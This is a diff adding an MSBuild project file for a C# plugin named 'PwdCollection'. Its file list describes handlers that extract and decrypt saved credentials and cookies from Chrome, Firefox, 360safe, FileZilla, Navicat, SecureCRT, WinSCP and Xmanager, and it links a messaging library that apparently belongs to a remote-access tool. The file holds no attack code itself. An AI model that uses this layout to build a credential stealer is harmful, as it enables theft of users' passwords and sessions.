@@ -1,0 +1,206 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" />
+  <Import Project="..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props" Condition="Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" />
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{549F9108-D2E5-4642-9A8F-A996C92F44BA}</ProjectGuid>
+    <OutputType>Library</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Plugin</RootNamespace>
+    <AssemblyName>PwdCollection</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\..\..\Binaries\Debug\Plugins\</OutputPath>
+    <DefineConstants>TRUE WIN32 _MSC_VER NDEBUG NO_TCL SQLITE_ASCII SQLITE_DISABLE_LFS SQLITE_ENABLE_OVERSIZE_CELL_CHECK SQLITE_MUTEX_OMIT SQLITE_OMIT_AUTHORIZATION SQLITE_OMIT_DEPRECATED SQLITE_OMIT_GET_TABLE SQLITE_OMIT_INCRBLOB SQLITE_OMIT_LOOKASIDE SQLITE_OMIT_SHARED_CACHE SQLITE_OMIT_UTF16 SQLITE_OMIT_VIRTUALTABLE SQLITE_OS_WIN SQLITE_SYSTEM_MALLOC VDBE_PROFILE_OFF </DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <NoWarn>0168 ; 0169; 0414; 0618; 0649</NoWarn>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <DebugType>none</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>..\..\..\Binaries\Release\Plugins\</OutputPath>
+    <DefineConstants>TRUE WIN32 _MSC_VER NDEBUG NO_TCL SQLITE_ASCII SQLITE_DISABLE_LFS SQLITE_ENABLE_OVERSIZE_CELL_CHECK SQLITE_MUTEX_OMIT SQLITE_OMIT_AUTHORIZATION SQLITE_OMIT_DEPRECATED SQLITE_OMIT_GET_TABLE SQLITE_OMIT_INCRBLOB SQLITE_OMIT_LOOKASIDE SQLITE_OMIT_SHARED_CACHE SQLITE_OMIT_UTF16 SQLITE_OMIT_VIRTUALTABLE SQLITE_OS_WIN SQLITE_SYSTEM_MALLOC VDBE_PROFILE_OFF </DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json, Version=12.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\..\..\packages\Newtonsoft.Json.12.0.3\lib\net40\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.DirectoryServices" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Connection.cs" />
+    <Compile Include="Handler\Browser\360safe\360safe.cs" />
+    <Compile Include="Handler\Browser\360safe\SqliteBase.cs" />
+    <Compile Include="Handler\Browser\chrome\AesGcm.cs" />
+    <Compile Include="Handler\Browser\chrome\BCrypt.cs" />
+    <Compile Include="Handler\Browser\chrome\ChromeCookie.cs" />
+    <Compile Include="Handler\Browser\chrome\Chromepwd.cs" />
+    <Compile Include="Handler\Browser\firefox\Cryptography\Asn1Der.cs" />
+    <Compile Include="Handler\Browser\firefox\Cryptography\Mozilla3DES.cs" />
+    <Compile Include="Handler\Browser\firefox\Cryptography\MozillaPBE.cs" />
+    <Compile Include="Handler\Browser\firefox\Cryptography\Pbkdf2.cs" />
+    <Compile Include="Handler\Browser\firefox\Cryptography\TripleDESHelper.cs" />
+    <Compile Include="Handler\Browser\firefox\firefoxpwd.cs" />
+    <Compile Include="Handler\Browser\firefox\Helpers\ByteHelper.cs" />
+    <Compile Include="Handler\Browser\firefox\Helpers\PasswordCheck.cs" />
+    <Compile Include="Handler\Browser\firefox\Models\BerkeleyDB.cs" />
+    <Compile Include="Handler\Browser\firefox\Models\models.cs" />
+    <Compile Include="Handler\Browser\SQLite\SQLiteDatabase.cs" />
+    <Compile Include="Handler\Browser\SQLite\SQLiteVdbe.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\alter_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\analyze_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\attach_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\auth_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\backup_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\bitvec_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\btmutex_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\BtreeInt_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\btree_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\Btree_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\build_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\callback_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\complete_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\date_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\Delagates.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\delete_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\expr_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\fault_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\func_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\global_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\hash_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\Hash_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\hwtime_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\insert_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\journal_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\keywordhash_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\legacy_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\loadext_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\main_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\malloc_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\mem0_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\mem1_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\memjournal_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\mutex_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\mutex_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\mutex_noop_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\mutex_w32.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\notify_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\opcodes_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\opcodes_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\os_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\os_common_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\os_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\os_win_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\pager_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\pager_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\parse_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\parse_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\pcache1_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\pcache_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\pcache_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\pragma_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\prepare_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\printf_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\random_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\resolve_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\rowset_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\select_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\sqlite3ext_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\sqlite3_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\sqliteicu_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\sqliteInt_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\sqliteLimit_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\status_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\table_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\tokenize_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\trigger_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\update_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\utf_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\util_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vacuum_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vdbeapi_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vdbeaux_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vdbeblob_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\VdbeInt_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vdbemem_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vdbe_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\Vdbe_h.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\vtab_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\walker_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\where_c.cs" />
+    <Compile Include="Handler\Browser\SQLite\src\_Custom.cs" />
+    <Compile Include="Handler\SharpFileZilla\FileZilla.cs" />
+    <Compile Include="Handler\SharpNavicat\Blowfish.cs" />
+    <Compile Include="Handler\SharpNavicat\Navicat11Cipher.cs" />
+    <Compile Include="Handler\SharpNavicat\Navicat12Cipher.cs" />
+    <Compile Include="Handler\SharpNavicat\navicatpwd.cs" />
+    <Compile Include="Handler\SharpSecureCrt\i.cs" />
+    <Compile Include="Handler\SharpSecureCrt\j.cs" />
+    <Compile Include="Handler\SharpSecureCrt\l.cs" />
+    <Compile Include="Handler\SharpSecureCrt\m.cs" />
+    <Compile Include="Handler\SharpSecureCrt\SecureCrt.cs" />
+    <Compile Include="Handler\SharpWinscp\winscp.cs" />
+    <Compile Include="Handler\Xmanager\getusersid.cs" />
+    <Compile Include="Handler\Xmanager\RC4.cs" />
+    <Compile Include="Handler\Xmanager\Utils.cs" />
+    <Compile Include="Handler\Xmanager\XClass.cs" />
+    <Compile Include="Handler\Xmanager\XClass2.cs" />
+    <Compile Include="Packet.cs" />
+    <Compile Include="Plugin.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="ILMerge.props" />
+    <None Include="packages.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+      <Name>MessagePackLib</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="ILMergeOrder.txt" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\..\..\packages\System.Data.SQLite.Core.1.0.112.1\build\net40\System.Data.SQLite.Core.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\System.Data.SQLite.Core.1.0.112.1\build\net40\System.Data.SQLite.Core.targets'))" />
+    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+  </Target>
+  <Import Project="..\..\..\packages\System.Data.SQLite.Core.1.0.112.1\build\net40\System.Data.SQLite.Core.targets" Condition="Exists('..\..\..\packages\System.Data.SQLite.Core.1.0.112.1\build\net40\System.Data.SQLite.Core.targets')" />
+  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+</Project>
